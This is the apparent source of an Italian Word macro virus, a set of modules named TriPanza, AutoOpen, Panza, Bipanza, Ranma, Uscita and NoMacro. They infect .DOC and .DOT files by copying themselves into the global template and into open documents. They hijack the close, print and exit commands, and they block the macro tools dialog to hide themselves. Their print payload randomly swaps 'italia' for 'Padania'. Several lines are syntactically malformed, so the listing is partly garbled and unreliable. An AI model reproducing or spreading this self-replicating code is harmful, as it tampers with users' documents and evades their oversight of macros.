   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Attribute VB_Name = "TriPanza"

   Public Sub MAIN()
   Dim infetta
   Dim puzzone$
   Dim Our$
   Dim CopiaMacro
   WordBasic.DisableInput 1
   infetta = 0
   puzzone$ = WordBasic.Call("NomeFinestra$")           'get name of the file
   Our$ = Mid(puzzone$, Len(puzzone$) - 3)
   If ((Our$ = ".DOC") Or (Our$ = ".DOT")) Then
                   infetta = 1             'be sure that it is an infectable
   End If                                  'item
   If ((WordBasic.IsMacro(0) = 0) And (infetta = 1)) Then
      WordBasic.ScreenUpdating 0
     CopiaMacro "Generale:AutoOpen", WordBasic.Call "NomeFinestra$" + ":AutoOpen", 1
     CopiaMacro "Generale:FileChiudi", WordBasic.Call "NomeFinestra$" + ":Panza", 1
     CopiaMacro "Generale:FileStampaPredef", WordBasic.Call "NomeFinestra$" + ":BiPanza", 1
     CopiaMacro "Generale:ChiudiDoc", WordBasic.Call "NomeFinestra$" + ":TriPanza", 1
     CopiaMacro "Generale:FileEsci", WordBasic.Call "NomeFinestra$" + ":Uscita", 1
     CopiaMacro "Generale:FileStampa", WordBasic.Call "NomeFinestra$" + ":Ranma", 1
     CopiaMacro "Generale:StrumMacro", WordBasic.Call "NomeFinestra$" + ":Nomacro", 1
     WordBasic.Call "FileSalvaConNome.Formato" = 1
   End If
   WordBasic.Call "ChiudiDoc"                               'call the old function
   WordBasic.ScreenUpdating 1                        'reenable updating
   End Sub

   Attribute VB_Name = "AutoOpen"

   Public Sub MAIN()
   Dim IsInstalled
   Dim conta
   Dim CopiaMacro
   WordBasic.DisableInput 1           'disable the interruption of the execution
   IsInstalled = 0          'installation check
   If ContaMacro__(0) > 0 Then
     For conta = 1 To ContaMacro__(0)
      If NomeMacro__$(conta, 0) = "AutoOpen" Then  'search for it
                   IsInstalled = 1               'yeah, it is already here
      End If
     Next conta
   End If

   If IsInstalled = 0 Then  'if not installed we will copy our macros
     CopiaMacro WordBasic.Call "NomeFinestra$" + ":AutoOpen", "Generale:AutoOpen", 1
     CopiaMacro WordBasic.Call "NomeFinestra$" + ":AutoOpen", "Generale:AutoExec", 1
     CopiaMacro WordBasic.Call "NomeFinestra$" + ":Panza", "Generale:FileChiudi", 1
     CopiaMacro WordBasic.Call "NomeFinestra$" + ":BiPanza", "Generale:FileStampaPredef", 1
     CopiaMacro WordBasic.Call "NomeFinestra$" + ":TriPanza", "Generale:ChiudiDoc", 1
     CopiaMacro WordBasic.Call "NomeFinestra$" + ":Uscita", "Generale:FileEsci", 1
     CopiaMacro WordBasic.Call "NomeFinestra$" + ":Ranma", "Generale:FileStampa", 1
     CopiaMacro WordBasic.Call "NomeFinestra$" + ":Nomacro", "Generale:StrumMacro", 1
     CopiaMacro WordBasic.Call "NomeFinestra$" + ":Nomacro", "Generale:FileModelli", 1
   End If
   End Sub

   Attribute VB_Name = "NoMacro"

   Public Sub MAIN()
   WordBasic.DisableInput 1
   'hehe, just here to bypass the macro selection
   End Sub

   Attribute VB_Name = "Bipanza"

   Public Sub MAIN()
   Dim xepmi
   WordBasic.DisableInput 1
   WordBasic.ScreenUpdating 0        'dont update the screen
   xepmi = WordBasic.Int(Rnd() * (25 - 1) + 1)   'put a random value in xepmi between
                                      '1 and 25
   If xepmi = 15 Then         'if 15 then our payload will be activated
    WordBasic.Call "ModificaSegnalibro.Nome" = "Trux", "Aggiungi" 'this put the bookmark
    WordBasic.Call "InizioDocumento"                              'go at the start
    WordBasic.Call "ModificaSostituisci.Trova" = "italia", "Sostituisci" := "Padania",
       ,"SoloParoleIntere" = 1, "SostituisciTutto" On Error Goto -1 : On Error Goto Tardi
   End If                  'complete our mission
    WordBasic.Call "FileStampaPredef"       'print the document
   Tardi:
   If xepmi = 15 Then        'reput the old words
     WordBasic.Call "ModificaSostituisci.Trova" = "Padania", "Sostituisci" := "italia",
     ,"SoloParoleIntere" = 1, "SostituisciTutto"      'reput old stuff
     If SegnalibroEsistente__("Trux") = -1 Then      'it the bookmark exist
       WordBasic.Call "ModificaSegnalibro.Nome" = "Trux", "VaiA"    'go to it and then delete
       WordBasic.Call "ModificaSegnalibro.Nome" = "Trux", "Elimina" 'it
     End If
   End If
   WordBasic.ScreenUpdating 1                                'reenable screen update
   End Sub

   Attribute VB_Name = "Uscita"

   Public Sub MAIN()
   WordBasic.DisableInput 1
   WordBasic.Call "StrumOpzioniSalva.SalvataggioNormalDot" = 0 'enable fast save of normal.dot
   WordBasic.Call "StrumOpzioniSalva.SalvaVeloce" = 1     'enable fast save for all the docs
   WordBasic.Call "FileEsci"        'exit the file
   End Sub

   Attribute VB_Name = "Ranma"

   Public Sub MAIN()
   Dim xepmit
   WordBasic.DisableInput 1
   Dim dlg As FileStampa
   On Error GoTo -1: On Error GoTo Dopo
   dlg
   dlg
   WordBasic.ScreenUpdating 0
   xepmit = WordBasic.Int(Rnd() * (31 - 1) + 1)   'put a random value in xepmi between
                                       '1 and 31
   If xepmit = 15 Then        'if 15 then our payload will be activated
     WordBasic.Call "ModificaSegnalibro.Nome" = "Trucciolo", "Aggiungi"
     WordBasic.Call "InizioDocumento"
     WordBasic.Call "ModificaSostituisci.Trova" = "italia", "Sostituisci" := "Padania",
     ,"SoloParoleIntere" = 1, "SostituisciTutto"
   End If
   FileStampa dlg
   If xepmit = 15 Then
     WordBasic.Call "ModificaSostituisci.Trova" = "Padania", "Sostituisci" := "italia",
     ,"SoloParoleIntere" = 1, "SostituisciTutto"
     If SegnalibroEsistente__("Trucciolo") = -1 Then
       WordBasic.Call "ModificaSegnalibro.Nome" = "Trucciolo", "VaiA"
       WordBasic.Call "ModificaSegnalibro.Nome" = "Trucciolo", "Elimina"
     End If
   End If
   Dopo:
   WordBasic.ScreenUpdating 1
   End Sub

   Attribute VB_Name = "Panza"

   Public Sub MAIN()
   Dim infetta
   Dim puzzone$
   Dim Our$
   Dim CopiaMacro
   WordBasic.DisableInput 1
   infetta = 0
   puzzone$ = WordBasic.Call("NomeFinestra$")              'get current name
   Our$ = Mid(puzzone$, Len(puzzone$) - 3)
   If ((Our$ = ".DOC") Or (Our$ = ".DOT")) Then
                   infetta = 1             'check if it is a DOC or DOT
   End If
   ' if it is a DOC or DOT and it isn't a macro window we will infect it
   If ((WordBasic.IsMacro(0) = 0) And (infetta = 1)) Then
     WordBasic.ScreenUpdating 0
     CopiaMacro "Generale:AutoOpen", WordBasic.Call "NomeFinestra$" + ":AutoOpen", 1
     CopiaMacro "Generale:FileChiudi", WordBasic.Call "NomeFinestra$" + ":Panza", 1
     CopiaMacro "Generale:FileStampaPredef", WordBasic.Call "NomeFinestra$" + ":BiPanza", 1
     CopiaMacro "Generale:ChiudiDoc", WordBasic.Call "NomeFinestra$" + ":TriPanza", 1
     CopiaMacro "Generale:FileEsci", WordBasic.Call "NomeFinestra$" + ":Uscita", 1
     CopiaMacro "Generale:FileStampa", WordBasic.Call "NomeFinestra$" + ":Ranma", 1
     CopiaMacro "Generale:StrumMacro", WordBasic.Call "NomeFinestra$" + ":Nomacro", 1
     WordBasic.Call "FileSalvaConNome.Formato" = 1
   End If
   On Error GoTo -1: On Error GoTo gusarji
   WordBasic.Call "FileChiudi"                             'close it!
   gusarji:
   WordBasic.ScreenUpdating 1
   End Sub
